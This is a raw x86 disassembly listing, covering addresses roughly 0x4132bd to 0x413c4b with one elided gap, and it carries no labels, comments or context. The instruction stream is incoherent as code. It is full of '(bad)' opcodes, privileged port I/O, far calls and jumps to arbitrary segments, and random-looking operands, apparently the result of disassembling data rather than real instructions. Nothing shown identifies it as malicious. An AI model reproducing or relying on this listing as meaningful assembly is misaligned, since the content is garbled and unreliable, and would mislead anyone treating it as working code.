  4132bd:	mov    edx,0xb8c1c4c7
  4132c2:	je     0x413310
  4132c4:	(bad)  
  4132c5:	push   DWORD PTR [ecx]
  4132c7:	mov    esp,0xaadd3681
  4132cc:	enter  0x9c75,0xbc
  4132d0:	mov    bl,0xd2
  4132d2:	call   0xdc04:0xa6cf92df
  4132d9:	push   ecx
  4132da:	xchg   edi,eax
  4132db:	imul   edi,ecx,0x37
  4132de:	lds    edi,FWORD PTR [esi]
  4132e0:	cmp    ah,ah
  4132e2:	sbb    DWORD PTR [ebx+0x7b3aec47],eax
  4132e8:	mov    WORD PTR [ecx],gs
  4132ea:	shl    BYTE PTR [esi+ecx*1-0x72],1
  4132ee:	fidiv  DWORD PTR [esi+0x16]
  4132f1:	mov    eax,ds:0x27aa97fb
  4132f6:	jp     0x413361
  4132f8:	es jmp 0x76837791
  4132fe:	ja     0x41335f
  413300:	mov    al,ds:0xf176e9bd
  413305:	push   esp
  413306:	psubsw mm1,QWORD PTR [edx+0x4]
  41330a:	cmp    DWORD PTR [ebx+0x5de041b2],esi
  413310:	sbb    ah,BYTE PTR [esp+esi*8+0x48]
  413314:	imul   edx,ebp,0xa156e91b
  41331a:	ret    
  41331b:	xchg   ebx,eax
  41331c:	aaa    
  41331d:	adc    BYTE PTR [edx-0x9],dh
  413320:	in     al,0xa3
  413322:	push   0x7c
  413324:	adc    BYTE PTR [eax],bl
  413326:	aaa    
  413327:	push   esi
  413328:	dec    ebx
  413329:	outs   dx,DWORD PTR ds:[esi]
  41332a:	out    dx,al
  41332b:	sbb    al,0x8
  41332d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332e:	xchg   esi,eax
  41332f:	(bad)  
  413330:	lods   eax,DWORD PTR ds:[esi]
  413331:	push   cs
  413332:	xor    BYTE PTR [edx],dl
  413334:	(bad)  
  413335:	lock or al,0xbe
  413338:	loope  0x413364
  41333a:	cmp    bh,BYTE PTR [edi-0x17]
  41333d:	cmp    ecx,DWORD PTR ds:0x1a65de50
  413343:	sahf   
  413344:	stc    
  413345:	or     BYTE PTR ds:0xb66edec7,dl
  41334b:	dec    ebp
  41334c:	push   eax
  41334d:	loope  0x41339e
  41334f:	mov    dh,BYTE PTR [edi]
  413351:	or     al,0xd6
  413353:	add    eax,0xc84751b4
  413358:	popa   
  413359:	mov    eax,ds:0x4623fbf6
  41335e:	ror    BYTE PTR [edx],1
  413360:	shl    DWORD PTR [edx],0x5a
  413363:	mov    ecx,ebp
  413365:	jmp    FWORD PTR [eax+0x5326705d]
  41336b:	inc    ecx
  41336c:	mov    al,0x95
  41336e:	clc    
  41336f:	cs cmp al,0xec
  413372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413373:	mov    dh,0xaf
  413375:	cwde   
  413376:	call   0xd61a:0x13039e79
  41337d:	sbb    dl,BYTE PTR [esi-0x32907b17]
  413383:	lahf   
  413384:	in     al,0x4
  413386:	ss pusha 
  413388:	push   esp
  413389:	lea    ecx,[ebx-0x4dde8936]
  41338f:	loope  0x4133c9
  413391:	sub    dl,ch
  413393:	add    eax,edi
  413395:	stos   DWORD PTR es:[edi],eax
  413396:	xor    BYTE PTR [edx-0x53],ch
  413399:	jecxz  0x4133be
  41339b:	aad    0xf3
  41339d:	mov    esp,0x9bfee479
  4133a2:	pop    ebp
  4133a3:	push   0x7c55e718
  4133a8:	xor    DWORD PTR [eax+esi*2],esi
  4133ab:	add    DWORD PTR [eax-0x2cd29b6],ecx
  4133b1:	push   es
  4133b2:	les    esi,FWORD PTR [edx-0x35]
  4133b5:	sbb    cl,BYTE PTR [ecx]
  4133b7:	push   esi
  4133b8:	inc    edx
  4133b9:	test   DWORD PTR [ebp-0x4e611894],0x8e6c4785
  4133c3:	imul   edi,DWORD PTR [ebx+ebx*2-0x28],0xffffffd7
  4133c8:	jno    0x4133b3
  4133ca:	int    0xb4
  4133cc:	inc    edx
  4133cd:	pop    ss
  4133ce:	adc    ah,BYTE PTR [edi]
  4133d0:	cdq    
  4133d1:	popf   
  4133d2:	daa    
  4133d3:	scas   eax,DWORD PTR es:[edi]
  4133d4:	pop    eax
  4133d5:	xor    BYTE PTR [ecx],bh
  4133d7:	shl    bl,0xb0
  4133da:	cmp    eax,0xddab88d0
  4133df:	jno    0x4133a1
  4133e1:	sahf   
  4133e2:	into   
  4133e3:	xchg   esi,eax
  4133e4:	pop    esp
  4133e5:	shr    DWORD PTR [eax-0x3b9b1c68],0x6b
  4133ec:	gs ret 
  4133ee:	aas    
  4133ef:	lds    ecx,FWORD PTR [ebx+ebx*1]
  4133f2:	inc    edi
  4133f3:	sub    al,0xf6
  4133f5:	ins    BYTE PTR es:[edi],dx
  4133f6:	inc    eax
  4133f7:	push   0xff4e809b
  4133fc:	push   eax
  4133fd:	push   cs
  4133fe:	call   0x527a:0xd0dad12a
  413405:	daa    
  413406:	loop   0x413480
  413408:	mov    edi,ss
  41340a:	repnz pop es
  41340c:	or     DWORD PTR [esi+0x558650c3],eax
  413412:	jg     0x413468
  413414:	arpl   WORD PTR [eax-0x6],ax
  413417:	mov    ebp,0x56e31c3b
  41341c:	sahf   
  41341d:	ins    BYTE PTR es:[edi],dx
  41341e:	ins    DWORD PTR es:[edi],dx
  41341f:	arpl   WORD PTR [ecx+esi*1+0x2],bx
  413423:	stos   DWORD PTR es:[edi],eax
  413424:	fwait
  413425:	push   edx
  413426:	int    0x7e
  413428:	lods   eax,DWORD PTR ds:[esi]
  413429:	(bad)  
  41342a:	not    BYTE PTR [edi+0x30]
  41342d:	push   es
  41342e:	fisubr WORD PTR [edi-0x40]
  413431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413432:	push   cs
  413433:	ja     0x4133e3
  413435:	cmp    ebp,DWORD PTR [ebp-0x16]
  413438:	mov    al,ds:0xa76ddaab
  41343d:	aam    0xc
  41343f:	loop   0x4133fb
  413441:	cmp    cl,dh
  413443:	or     dl,cl
  413445:	retf   0xb335
  413448:	inc    ebx
  413449:	pop    eax
  41344a:	arpl   WORD PTR ss:[edx-0x47ffe4db],bp
  413451:	and    cl,ch
  413453:	sub    BYTE PTR [edi+0x54ca7b30],bl
  413459:	(bad)  
  41345a:	fbld   TBYTE PTR [esi]
  41345c:	sbb    DWORD PTR [eax-0x2fe77981],edi
  413462:	push   cs
  413463:	mov    al,0x1
  413465:	cli    
  413466:	and    bh,BYTE PTR [eax]
  413468:	stc    
  413469:	and    eax,0x476c858b
  41346e:	inc    esi
  41346f:	pop    ebx
  413470:	mov    ds:0xcb7fc28e,al
  413475:	sbb    eax,0x21a5f39c
  41347a:	ds or  esi,esi
  41347d:	sbb    al,0x99
  41347f:	sbb    cl,BYTE PTR [ebp-0x28]
  413482:	in     eax,dx
  413483:	(bad)  
  413484:	jne    0x4134be
  413486:	popa   
  413487:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413489:	leave  
  41348a:	jecxz  0x413439
  41348c:	jge    0x41343f
  41348e:	neg    BYTE PTR [ebx+0x14d2617b]
  413494:	fidiv  WORD PTR [esi+0x29c1bb37]
  41349a:	dec    ah
  41349c:	adc    edi,DWORD PTR [ebx+0x66]
  41349f:	fsub   DWORD PTR [ebp-0x6e]
  4134a2:	mov    bh,0x32
  4134a4:	ins    DWORD PTR es:[edi],dx
  4134a5:	mov    ch,bh
  4134a7:	and    ebx,edx
  4134a9:	adc    ecx,0x1fb8300d
  4134af:	pop    ecx
  4134b0:	xchg   ebp,eax
  4134b1:	mov    bh,0x42
  4134b3:	pop    ds
  4134b4:	xor    BYTE PTR [edi],0x8a
  4134b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134b8:	loopne 0x4134c3
  4134ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134bb:	test   DWORD PTR [esi],ebp
  4134bd:	add    al,0x33
  4134bf:	jne    0x413475
  4134c1:	pop    es
  4134c2:	scas   eax,DWORD PTR es:[edi]
  4134c3:	mov    edx,0xd68d5598
  4134c8:	and    dl,BYTE PTR [ebx-0x7dcf69d5]
  4134ce:	push   ecx
  4134cf:	pushf  
  4134d0:	and    BYTE PTR gs:[ecx+0x45f1ad05],dl
  4134d7:	(bad)  
  4134d8:	xor    al,0x2c
  4134da:	fcomp  DWORD PTR [esi+edx*2-0x6d6ac97e]
  4134e1:	rcl    BYTE PTR [edx-0xd],0x7e
  4134e5:	(bad)  
  4134e7:	(bad)  
  4134e8:	cld    
  4134e9:	mov    ?,WORD PTR [edi-0x3a]
  4134ec:	pop    DWORD PTR [ebp+0x3895d3e2]
  4134f2:	sub    bl,dh
  4134f4:	jecxz  0x4134eb
  4134f6:	mov    ebp,0x9eba79f7
  4134fb:	dec    esi
  4134fc:	xor    ebp,esp
  4134fe:	xchg   ebx,eax
  4134ff:	sahf   
  413500:	xchg   dh,dl
  413502:	or     BYTE PTR [eax],0x16
  413505:	jmp    0x3a70:0xe3279128
  41350c:	fs in  eax,0xe8
  41350f:	jge    0x413544
  413511:	ins    BYTE PTR es:[edi],dx
  413512:	stos   BYTE PTR es:[edi],al
  413513:	push   dx
  413515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413516:	pop    ecx
  413517:	add    edi,DWORD PTR [ebp+0x2f71f384]
  41351d:	test   BYTE PTR ds:[edi+0x7dbafded],dl
  413524:	xor    al,0xba
  413526:	clc    
  413527:	pop    ss
  413528:	xchg   ebx,eax
  413529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41352a:	mov    ebp,0xeb03eefc
  41352f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413530:	sahf   
  413531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413532:	stc    
  413533:	xchg   esi,eax
  413534:	sbb    BYTE PTR [edx-0x2f],dl
  413537:	pop    es
  413538:	mov    ebp,0x37483f6d
  41353d:	mov    esi,0xdd84ed48
  413542:	sbb    ecx,DWORD PTR [eax+0x462374d]
  413548:	push   esp
  413549:	xchg   edi,eax
  41354a:	mov    ds:0xf754f95f,al
  41354f:	mov    esi,0x4acc4049
  413554:	rol    BYTE PTR [esi+ebx*1-0x67],0xd3
  413559:	scas   al,BYTE PTR es:[edi]
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	push   eax
  41355c:	pop    edi
  41355d:	in     eax,dx
  41355e:	adc    eax,0x4ab3c55e
  413563:	(bad)  
  413564:	iret   
  413565:	xchg   dh,bl
  413567:	pop    edi
  413568:	sub    BYTE PTR [ebp-0x41],dl
  41356b:	mov    al,ds:0x8abd084f
  413570:	lods   eax,DWORD PTR ds:[esi]
  413571:	mov    ebp,DWORD PTR [edi]
  413573:	mov    dl,BYTE PTR [ebx+0x173fff98]
  413579:	fsubr  st(2),st
  41357b:	hlt    
  41357c:	push   esi
  41357d:	fstp   TBYTE PTR [edi]
  41357f:	mov    dh,0xaa
  413581:	repz cwde 
  413583:	inc    ebp
  413584:	shl    BYTE PTR ds:0x71cb485f,cl
  41358a:	ss aas 
  41358c:	in     al,dx
  41358d:	xor    eax,esp
  41358f:	sahf   
  413590:	mov    fs,WORD PTR [ecx-0x23]
  413593:	mov    eax,ds:0xd0dc4188
  413598:	fdiv   DWORD PTR [esi+0x6b8a85b5]
  41359e:	(bad)  
  41359f:	in     al,0x15
	...
  413779:	call   0x7fb79f4e
  41377e:	idiv   ecx
  413780:	ficom  WORD PTR [ebp+0x2e]
  413783:	inc    esp
  413784:	and    al,0x3a
  413786:	test   al,0xda
  413788:	(bad)  
  413789:	fld    TBYTE PTR [edi+0x1]
  41378c:	add    BYTE PTR [eax],ah
  41378e:	pop    es
  41378f:	add    BYTE PTR [eax],al
  413791:	jg     0x41379b
  413793:	sar    esp,1
  413795:	cmp    BYTE PTR [esp+ebx*1+0x3e],bh
  413799:	mov    ebp,0xdc0114e3
  41379e:	test   DWORD PTR [edi],ecx
  4137a0:	imul   edi,eax,0x7a
  4137a3:	nop
  4137a4:	call   0x9666:0x70382514
  4137ab:	adc    eax,DWORD PTR [esi]
  4137ad:	xchg   DWORD PTR [ebp+0x61],eax
  4137b0:	sub    eax,0x3573c59f
  4137b5:	push   eax
  4137b6:	jae    0x413809
  4137b8:	stos   DWORD PTR es:[edi],eax
  4137b9:	call   0x725c:0x3cea62bc
  4137c0:	lahf   
  4137c1:	cld    
  4137c2:	mov    ah,0x3d
  4137c4:	mov    dl,0x1a
  4137c6:	mov    al,0x4e
  4137c8:	adc    cl,BYTE PTR [eax+edi*8-0x7eeb48a2]
  4137cf:	mov    bh,0xcd
  4137d1:	mov    edx,DWORD PTR [ebp+eax*8-0x5]
  4137d5:	das    
  4137d6:	mov    WORD PTR [edi-0x1a],es
  4137d9:	pusha  
  4137da:	and    eax,0xe365b9de
  4137df:	push   ebp
  4137e0:	fcomp  st(4)
  4137e2:	je     0x4137a3
  4137e4:	test   al,0x78
  4137e6:	push   ebp
  4137e7:	jnp    0x4137ec
  4137e9:	inc    eax
  4137ea:	das    
  4137eb:	popa   
  4137ec:	jae    0x4137a2
  4137ee:	xchg   edi,eax
  4137ef:	popa   
  4137f0:	add    DWORD PTR [eax-0x31],ecx
  4137f3:	popf   
  4137f4:	dec    ecx
  4137f5:	in     al,0x81
  4137f7:	sahf   
  4137f8:	stos   DWORD PTR es:[edi],eax
  4137f9:	adc    DWORD PTR [ecx-0x79],eax
  4137fc:	ficom  DWORD PTR [eax+0x5e751abd]
  413802:	sub    esp,DWORD PTR [esi+0x3a1e818b]
  413808:	push   ecx
  413809:	mov    dh,ch
  41380b:	mov    ah,0xd2
  41380d:	push   ebx
  41380e:	mov    bh,0x50
  413810:	not    DWORD PTR [ebp+eax*4-0x79673e2]
  413817:	push   es
  413818:	jo     0x413887
  41381a:	scas   eax,DWORD PTR es:[edi]
  41381b:	jp     0x4137ba
  41381d:	jmp    0x413822
  41381f:	ror    DWORD PTR [ecx],1
  413821:	dec    ecx
  413823:	pop    edx
  413824:	mov    al,0x51
  413826:	popa   
  413827:	int3   
  413828:	imul   edi,DWORD PTR [ecx+0x3199ca57],0xfffffff4
  41382f:	fadd   QWORD PTR [ebx+0x64]
  413832:	dec    ebp
  413833:	jnp    0x413819
  413835:	daa    
  413836:	sbb    edx,DWORD PTR [edi-0x4dda86db]
  41383c:	push   eax
  41383d:	aas    
  41383e:	cld    
  41383f:	stc    
  413840:	xchg   esi,eax
  413841:	xor    esp,DWORD PTR [edx-0x519f49ab]
  413847:	stc    
  413848:	ja     0x41381c
  41384a:	and    ebx,DWORD PTR [edi-0x7c]
  41384d:	retf   
  41384e:	xchg   ebx,eax
  41384f:	ror    BYTE PTR [ecx+0x77],1
  413852:	out    0x36,eax
  413854:	repnz xor al,0x6e
  413857:	and    ebp,DWORD PTR [edx]
  413859:	adc    BYTE PTR [edi-0x3c],cl
  41385c:	ins    BYTE PTR es:[edi],dx
  41385d:	pop    ss
  41385e:	sbb    BYTE PTR [edx-0x4a],ch
  413861:	gs ja  0x4138cd
  413864:	xor    al,BYTE PTR [eax+0x3047170]
  41386a:	xor    DWORD PTR [edx],ebx
  41386c:	shl    cl,cl
  41386e:	sti    
  41386f:	mov    esp,0xc2fbbe1
  413874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413875:	push   esi
  413876:	xchg   ebx,eax
  413877:	cli    
  413878:	pop    ebp
  413879:	in     al,dx
  41387a:	pop    esi
  41387b:	sahf   
  41387c:	pop    ebx
  41387d:	aaa    
  41387e:	adc    ecx,0xac94e918
  413884:	adc    al,ah
  413886:	stc    
  413887:	aas    
  413888:	test   BYTE PTR [eax],bh
  41388a:	cld    
  41388b:	in     al,0x1a
  41388d:	xchg   esi,eax
  41388e:	push   ebx
  41388f:	enter  0x924c,0x77
  413893:	push   eax
  413894:	test   dh,dl
  413896:	dec    edi
  413897:	push   0xfffffff7
  413899:	(bad)  
  41389b:	jl     0x413863
  41389d:	add    bl,BYTE PTR [ebx+0x52]
  4138a0:	test   DWORD PTR [edi*8-0x232fded8],ebp
  4138a7:	jmp    0x5910e0bb
  4138ac:	loop   0x413928
  4138ae:	imul   ebp,DWORD PTR [ebx+0x240324f],0x18f511a9
  4138b8:	and    esi,DWORD PTR [edx]
  4138ba:	cmp    BYTE PTR [ecx+0x62],0x31
  4138be:	sub    eax,0xe4f7aa0f
  4138c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138c4:	jecxz  0x4138ce
  4138c6:	fistp  QWORD PTR [esi-0x7a]
  4138c9:	sti    
  4138ca:	inc    ah
  4138cc:	mov    ah,0xff
  4138ce:	loop   0x4138d3
  4138d0:	jbe    0x413915
  4138d2:	jnp    0x41387a
  4138d4:	mov    bh,0x6d
  4138d6:	std    
  4138d7:	loop   0x4138a5
  4138d9:	dec    esi
  4138da:	loope  0x41389c
  4138dc:	(bad)  
  4138dd:	fmul   DWORD PTR [ecx-0xc2cec55]
  4138e3:	mov    BYTE PTR [esi+0x79a693e8],al
  4138e9:	dec    esp
  4138ea:	fcom   QWORD PTR [edx+0x13ba68d0]
  4138f0:	fstp   DWORD PTR [esi-0x23ad0d64]
  4138f6:	xor    edi,DWORD PTR [esi-0x40]
  4138f9:	loope  0x41390b
  4138fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138fc:	push   edx
  4138fd:	test   al,0xbc
  4138ff:	xor    eax,0xc4f0ad57
  413904:	push   edi
  413905:	loop   0x413896
  413907:	jg     0x413909
  413909:	in     al,dx
  41390a:	adc    eax,0x351b56e3
  41390f:	dec    edx
  413910:	push   ebx
  413911:	dec    esp
  413912:	hlt    
  413913:	cs out 0x23,al
  413916:	pop    eax
  413917:	jecxz  0x413914
  413919:	jmp    0xfadf585
  41391e:	pop    edi
  41391f:	loope  0x4138f1
  413921:	cmp    al,0xfe
  413923:	sub    al,0xbb
  413925:	sub    DWORD PTR [eax],edi
  413927:	mov    bh,0xf1
  413929:	fs mov eax,0xd2dd41e0
  41392f:	add    DWORD PTR [edi],ecx
  413931:	add    al,0xd9
  413933:	mov    ecx,0xfc580a25
  413938:	xchg   ebx,eax
  413939:	daa    
  41393a:	fcomp  QWORD PTR [ebp+0x76aae61a]
  413940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413941:	adc    BYTE PTR [edx-0x7a],0x1
  413945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413946:	pop    eax
  413947:	mov    ecx,ebp
  413949:	bnd jnp 0x4138ce
  41394c:	ret    0x888d
  41394f:	(bad)  
  413950:	fstp   st(5)
  413952:	mov    esp,0x10ff562
  413957:	fiadd  DWORD PTR [ecx-0x1ec378e9]
  41395d:	xadd   DWORD PTR [ebx],edx
  413960:	jmp    0xa4b4249d
  413965:	and    DWORD PTR [edx+0x6f],edx
  413968:	jb     0x413915
  41396a:	xchg   ecx,eax
  41396b:	jb     0x413905
  41396d:	adc    al,BYTE PTR [ebx-0x17]
  413970:	repz jo 0x4139a3
  413973:	and    dl,al
  413975:	or     BYTE PTR [ebp+ebx*4-0x60],0x19
  41397a:	js     0x413937
  41397c:	arpl   WORD PTR [ebp+0x64209402],ax
  413982:	add    eax,0x40277769
  413987:	daa    
  413988:	das    
  413989:	mov    cl,0xcc
  41398b:	(bad)  [ecx+0x62]
  41398e:	aaa    
  41398f:	in     eax,0x39
  413991:	jno    0x413947
  413993:	push   edx
  413994:	adc    al,dl
  413996:	in     eax,0xbc
  413998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413999:	push   esi
  41399a:	or     al,0xd8
  41399c:	adc    al,0x38
  41399e:	inc    ebx
  41399f:	fistp  QWORD PTR ds:[eax+ecx*2+0x7514b267]
  4139a7:	cdq    
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	jecxz  0x41393a
  4139ab:	cdq    
  4139ac:	in     al,0x99
  4139ae:	mov    dh,BYTE PTR [esi]
  4139b0:	add    al,BYTE PTR [edx+0x71]
  4139b3:	les    edi,FWORD PTR [edi-0x61]
  4139b6:	jmp    0x28ae:0xd403046e
  4139bd:	cmp    ebp,DWORD PTR [esi+0x1f]
  4139c0:	jo     0x413993
  4139c2:	lods   al,BYTE PTR ds:[esi]
  4139c3:	sub    al,0xc7
  4139c5:	pop    ebx
  4139c6:	or     cl,0x6a
  4139c9:	push   esi
  4139ca:	std    
  4139cb:	shr    ah,1
  4139cd:	fld    QWORD PTR [esi+0x30]
  4139d0:	or     al,0x9f
  4139d2:	ins    BYTE PTR es:[edi],dx
  4139d3:	out    0xc9,eax
  4139d5:	jp     0x4139f8
  4139d7:	out    0xf0,eax
  4139d9:	sbb    BYTE PTR [ebx],0xd6
  4139dc:	test   al,0xf6
  4139de:	(bad)  
  4139df:	cmp    cl,BYTE PTR [ebx]
  4139e1:	(bad)  
  4139e2:	lods   eax,DWORD PTR ds:[esi]
  4139e3:	xchg   edx,eax
  4139e4:	iret   
  4139e5:	iret   
  4139e6:	pop    ds
  4139e7:	imul   esp,ecx,0xffffff82
  4139ea:	addr16 sti 
  4139ec:	mov    esi,0xa1e9a1c7
  4139f1:	popa   
  4139f2:	sbb    al,0x18
  4139f4:	adc    BYTE PTR [ebx+0x4],cl
  4139f7:	cmp    al,0x49
  4139f9:	hlt    
  4139fa:	cmp    DWORD PTR [esp+edx*8],edx
  4139fd:	test   eax,0x8b3ed55b
  413a02:	pop    ebx
  413a03:	ret    0x11fa
  413a06:	mov    es,WORD PTR [edi-0x34803a2a]
  413a0c:	pop    edi
  413a0d:	dec    edx
  413a0e:	sub    DWORD PTR [ecx+0x5d97cfe8],ecx
  413a14:	lock xor bh,BYTE PTR [ebx-0x5c8e8efc]
  413a1b:	gs mov esp,0xb3a3da9e
  413a21:	and    DWORD PTR [esi],0xa4bc3b58
  413a27:	and    eax,0xdfe6dcbc
  413a2c:	nop
  413a2d:	pop    esi
  413a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a2f:	sub    edx,DWORD PTR [ebx-0x42]
  413a32:	loop   0x4139f4
  413a34:	adc    BYTE PTR [ebx+eax*2],al
  413a37:	std    
  413a38:	aaa    
  413a39:	retf   
  413a3a:	xchg   ecx,eax
  413a3b:	adc    esp,DWORD PTR [edx]
  413a3d:	das    
  413a3e:	mov    ds:0xf2fc0739,al
  413a43:	mov    al,0x21
  413a45:	mov    esp,0xad183a8c
  413a4a:	jno    0x413a88
  413a4c:	loop   0x413a5a
  413a4e:	or     al,0xff
  413a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a51:	addr16 daa 
  413a53:	lahf   
  413a54:	mov    ds:0x822af04e,eax
  413a59:	repnz scas eax,DWORD PTR es:[edi]
  413a5b:	sbb    eax,0xa701da99
  413a60:	in     al,dx
  413a61:	addr16 mov ecx,0x1daab4c7
  413a67:	arpl   WORD PTR ds:0x8ca8ecbc,si
  413a6d:	fptan  
  413a6f:	aam    0x6d
  413a71:	sbb    dh,BYTE PTR [edi-0x4cbfd763]
  413a77:	lods   al,BYTE PTR ds:[esi]
  413a78:	or     ecx,DWORD PTR [eax]
  413a7a:	xor    DWORD PTR ds:0xfbfe05ab,ebp
  413a80:	fdiv   DWORD PTR [ebp-0x50]
  413a83:	retf   
  413a84:	add    DWORD PTR [eax-0x41a25472],esp
  413a8a:	loopne 0x413a12
  413a8c:	push   esi
  413a8d:	and    esp,DWORD PTR [edi-0x31]
  413a90:	clc    
  413a91:	add    al,0x15
  413a93:	mov    bx,0x524
  413a97:	jl     0x413a1f
  413a99:	sub    BYTE PTR [edi],ah
  413a9b:	out    dx,al
  413a9c:	or     eax,0x4b63b01e
  413aa1:	jnp    0x413ab4
  413aa3:	cli    
  413aa4:	dec    eax
  413aa5:	mov    ch,0x31
  413aa7:	xor    BYTE PTR [ebp+0x7c],bl
  413aaa:	not    bh
  413aac:	lds    ecx,FWORD PTR [edi-0x35c5e4dd]
  413ab2:	mov    edx,0x11de4a83
  413ab7:	test   eax,0x6a5d1ac9
  413abc:	and    DWORD PTR [edx],edx
  413abe:	jmp    0xfd17:0x277c52d3
  413ac5:	nop    DWORD PTR [edi]
  413ac8:	or     dl,bh
  413aca:	or     al,0xc5
  413acc:	adc    eax,0xf7a28485
  413ad1:	sbb    esi,edx
  413ad3:	sbb    edx,ebx
  413ad5:	sub    eax,0x6477b9d
  413ada:	cmp    DWORD PTR [edx+0x3a],eax
  413add:	add    cl,BYTE PTR ds:0xa60c0afb
  413ae3:	sub    ch,BYTE PTR [ecx]
  413ae5:	leave  
  413ae6:	xchg   edi,eax
  413ae7:	rcl    dl,1
  413ae9:	pushf  
  413aea:	outs   dx,BYTE PTR ds:[esi]
  413aeb:	ds mov ebp,0x9cc0a0fb
  413af1:	jns    0x413ab3
  413af3:	enter  0x16a6,0xb5
  413af7:	pop    ecx
  413af8:	in     eax,dx
  413af9:	jmp    0xd2dbee28
  413afe:	pop    eax
  413aff:	dec    esp
  413b00:	mov    esi,0xe1eac58d
  413b05:	xchg   BYTE PTR [ecx],ah
  413b07:	pop    esp
  413b08:	stos   BYTE PTR es:[edi],al
  413b09:	lods   al,BYTE PTR ds:[esi]
  413b0a:	or     DWORD PTR [ebx],esp
  413b0c:	dec    edx
  413b0d:	repz jmp 0xc076:0xc2d7e26c
  413b15:	xchg   ebp,eax
  413b16:	jbe    0x413b94
  413b18:	push   ebp
  413b19:	into   
  413b1a:	icebp  
  413b1b:	in     al,dx
  413b1c:	jmp    0xdeb3:0xaa2dae81
  413b23:	fist   WORD PTR [ebx-0x58]
  413b26:	loope  0x413ab7
  413b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b29:	cmp    al,0xa0
  413b2b:	sub    eax,0x1f34c846
  413b30:	lock test eax,0xd89a47e8
  413b36:	push   ds
  413b37:	int3   
  413b38:	jno    0x413b91
  413b3a:	enter  0x8979,0xbb
  413b3e:	pop    esi
  413b3f:	or     DWORD PTR [eax-0x4f2357aa],ecx
  413b45:	jo     0x413b27
  413b47:	mov    al,0xa9
  413b49:	push   ds
  413b4a:	lods   eax,DWORD PTR ds:[esi]
  413b4b:	ins    BYTE PTR es:[edi],dx
  413b4c:	push   esi
  413b4d:	int3   
  413b4e:	jge    0x413bca
  413b50:	jo     0x413b5c
  413b52:	jo     0x413b41
  413b54:	xor    edx,ebx
  413b56:	add    esp,esp
  413b58:	out    dx,al
  413b59:	out    0xc8,al
  413b5b:	adc    dh,bl
  413b5d:	loop   0x413ae1
  413b5f:	inc    ebx
  413b60:	jae    0x413b0a
  413b62:	rcr    BYTE PTR [edi],1
  413b64:	push   DWORD PTR [edi]
  413b66:	out    dx,al
  413b67:	je     0x413b89
  413b69:	in     eax,dx
  413b6a:	ffreep st(0)
  413b6c:	sbb    DWORD PTR [ecx+0x57],ecx
  413b6f:	fnstcw WORD PTR [esi+ebp*4-0x12]
  413b73:	mov    eax,ds:0x51df3620
  413b78:	sub    ch,BYTE PTR [esi-0x696f4ad]
  413b7e:	daa    
  413b7f:	xor    BYTE PTR [edi+0x1929d2b4],ch
  413b85:	mov    ds:0x2f704efa,al
  413b8a:	inc    esp
  413b8b:	mov    eax,0x86ace661
  413b90:	(bad)  
  413b92:	lds    edi,FWORD PTR [edi]
  413b94:	or     eax,0x756841f9
  413b99:	mov    ds:0x357eb7c6,eax
  413b9e:	cmp    ecx,DWORD PTR [edx]
  413ba0:	stos   BYTE PTR es:[edi],al
  413ba1:	pop    ds
  413ba2:	int    0xfd
  413ba4:	fcomi  st,st(2)
  413ba6:	cmp    al,0x44
  413ba8:	ds (bad) 
  413baa:	cmp    ch,dh
  413bac:	addr16 jmp 0xa00bc6a2
  413bb2:	ficomp DWORD PTR [ebp-0x27d933c7]
  413bb8:	mov    ebx,0x13115b0e
  413bbd:	outs   dx,BYTE PTR ds:[esi]
  413bbe:	mov    ds:0xe46aac04,al
  413bc3:	pop    ax
  413bc5:	jmp    0x89d5:0x99b71bbe
  413bcc:	mov    DWORD PTR [ecx-0x68],edx
  413bcf:	jmp    0x2302:0x584952c5
  413bd6:	or     al,0x16
  413bd8:	sub    BYTE PTR [eax+0x4a8594bd],ah
  413bde:	push   0xffffffb1
  413be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413be1:	std    
  413be2:	div    BYTE PTR [eax+0x17]
  413be5:	daa    
  413be6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  413be8:	mov    edi,0x787d2d44
  413bed:	mov    DWORD PTR [edx+0x77],0x6806ed91
  413bf4:	jecxz  0x413bf2
  413bf6:	aam    0xb8
  413bf8:	ror    al,cl
  413bfa:	mov    edi,0xf98e3cbe
  413bff:	add    al,0xee
  413c01:	mov    eax,0x607bc16
  413c06:	sahf   
  413c07:	cwde   
  413c08:	add    BYTE PTR [ecx],0x30
  413c0b:	xlat   BYTE PTR ds:[ebx]
  413c0c:	xchg   esi,ebp
  413c0e:	les    esi,FWORD PTR ds:0x37be6ca1
  413c14:	leave  
  413c15:	gs aaa 
  413c17:	mov    dl,0x2c
  413c19:	int    0x99
  413c1b:	loope  0x413c85
  413c1d:	and    BYTE PTR [edi-0x7e3bb17c],dl
  413c23:	shr    DWORD PTR [edi+0x44],0x9e
  413c27:	in     al,dx
  413c28:	inc    ebx
  413c29:	jns    0x413c2a
  413c2b:	adc    DWORD PTR [edx+esi*1+0x2a9b6190],ecx
  413c32:	das    
  413c33:	jo     0x413bf8
  413c35:	add    al,BYTE PTR [edx+0x17]
  413c38:	push   eax
  413c39:	jb     0x413c7b
  413c3b:	add    al,0x6e
  413c3d:	add    eax,0xe7397e77
  413c42:	mov    esp,0x5c59b464
  413c47:	ret    
  413c48:	ins    DWORD PTR es:[edi],dx
  413c49:	or     ch,BYTE PTR [esi+0x5b]
